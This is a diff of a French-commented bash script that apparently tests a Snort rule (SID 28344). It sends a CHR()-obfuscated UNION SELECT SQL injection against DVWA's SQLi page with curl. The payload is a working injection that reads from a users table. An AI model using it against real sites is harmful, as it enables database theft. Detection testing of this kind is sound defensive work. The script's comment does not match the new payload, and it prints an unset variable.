@@ -59,11 +59,11 @@ fi
 echo "[*] Étape 6 : Envoi du payload d'obfuscation SQL (Trigger SID 28344)..."
 
 # Payload contenant exactement 5 occurrences consécutives de 'CHR(' dans l'URI
-PAYLOAD="id=UNION+SELECT+CHR(114)CHR(111)CHR(111)CHR(114)CHR(115)&Submit=Submit"
+PAYLOAD_OBFUSCATED="%27%20UNION%20SELECT%20CHR(115)||CHR(101)||CHR(108)||CHR(101)||CHR(99)||CHR(116),user_id%20FROM%20users--%20"
 
 # Exécution de la requête cURL
 curl -v -H "Cookie: PHPSESSID=${PHPSESSID}" \
-     "${BASE_URL}/vulnerabilities/sqli/?id=1+AND+CHR(65)CHR(66)CHR(67)CHR(68)CHR(69)&Submit=Submit"
+     "${BASE_URL}/vulnerabilities/sqli/?id=${PAYLOAD_OBFUSCATED}&Submit=Submit"
 
 
 echo "[+] Requête envoyée. Code retour HTTP du serveur : $RESPONSE"
